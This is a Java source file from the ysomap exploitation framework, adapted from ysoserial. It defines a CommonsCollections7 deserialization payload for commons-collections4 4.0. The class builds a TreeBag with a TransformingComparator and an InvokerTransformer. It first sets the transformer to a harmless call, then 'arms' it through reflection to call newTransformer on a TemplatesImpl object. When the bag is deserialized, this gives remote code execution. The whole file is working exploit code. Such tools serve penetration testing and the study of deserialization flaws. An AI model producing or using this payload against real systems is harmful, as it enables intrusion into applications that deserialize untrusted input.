package ysomap.payloads.java.commons.collection_v4;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import org.apache.commons.collections4.bag.TreeBag;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.InvokerTransformer;
import ysomap.bullets.Bullet;
import ysomap.common.annotation.*;
import ysomap.bullets.jdk.TemplatesImplBullet;
import ysomap.core.util.ReflectionHelper;
import ysomap.payloads.AbstractPayload;

/**
 * from ysoserial CommonsCollection8
 * @author wh1t3P1g
 * @since 2020/2/18
 */
@SuppressWarnings({"rawtypes","unchecked"})
@Payloads
@Targets({Targets.JDK})
@Dependencies({"org.apache.commons:commons-collections4:4.0"})
@Require(bullets = {"TemplatesImplBullet"}, param = false)
@Authors({ Authors.NAVALORENZO })
public class CommonsCollections7 extends AbstractPayload<TreeBag> {

    @Override
    public boolean checkObject(Object obj) {
        return obj instanceof TemplatesImpl;
    }

    @Override
    public Bullet getDefaultBullet(Object... args) throws Exception {
        return TemplatesImplBullet.newInstance(args);
    }

    @Override
    public TreeBag pack(Object obj) throws Exception {
        // setup harmless chain
        final InvokerTransformer transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);

        // define the comparator used for sorting
        TransformingComparator comp = new TransformingComparator(transformer);

        // prepare CommonsCollections object entry point
        TreeBag tree = new TreeBag(comp);
        tree.add(obj);

        // arm transformer
        ReflectionHelper.setFieldValue(transformer, "iMethodName", "newTransformer");

        return tree;
    }

}
